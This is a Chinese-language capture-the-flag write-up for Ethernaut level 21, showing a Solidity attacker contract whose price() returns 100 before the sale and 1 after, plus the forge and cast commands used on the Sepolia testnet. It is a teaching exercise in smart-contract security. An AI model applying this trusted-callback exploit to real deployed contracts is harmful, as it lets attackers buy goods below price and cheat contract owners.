# Level 21

[The Ethernaut level 21](https://ethernaut.openzeppelin.com/level/21)

这一关的目的是以低于要求的价格从商店购买物品。合约中也没有实际支付，只是概念上的支出。

仔细阅读合约，`Shop` 合约定义了一个 `Buyer` 接口，但没有具体的实现。在 `buy` 函数中依赖了一个 `Buyer` 实例，且这个实例还是由 `msg.sender` 初始化的，即 `shop` 合约要求使用一个 `Buyer` 合约去购买(`buy`)，因此可以从这里做文章。

只要自己部署一个实现 `Buyer` 接口的合约，`price()` 根据不同状态返回不同的值。比如，当商品已售卖，返回1；商品未售卖，返回100（>=100）。

攻击者合约：
```
contract Attacker is Buyer {
    Shop level;

    constructor(address level_) {
        level = Shop(level_);
    }

    function price() external view returns (uint256) {
        return level.isSold() ? 1 : 100;
    }

    function attack() external {
        level.buy();
    }
}
```

执行脚本：
```
forge script script/Level21.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

完整代码见：[这里](../../ethernaut/script/Level21.s.sol)

查询购买后的 `price`：(返回 1)
```
cast call 0x217464Bcc60Ae344273201a91E6568486c3a07EA \
"price()(uint256)" \
--rpc-url sepolia
```

链上记录：
- [level(`Shop`)](https://sepolia.etherscan.io/address/0x217464Bcc60Ae344273201a91E6568486c3a07EA)
- [Attacker(Buyer)](https://sepolia.etherscan.io/address/0xFB817CF418A06D94219F678021858B5218A78d52)
- [attack 交易](https://sepolia.etherscan.io/tx/0x1d961778a5a88a5c5eb667f73f3db7a774f3d1af1fc5554935ddd9f91ac884c9)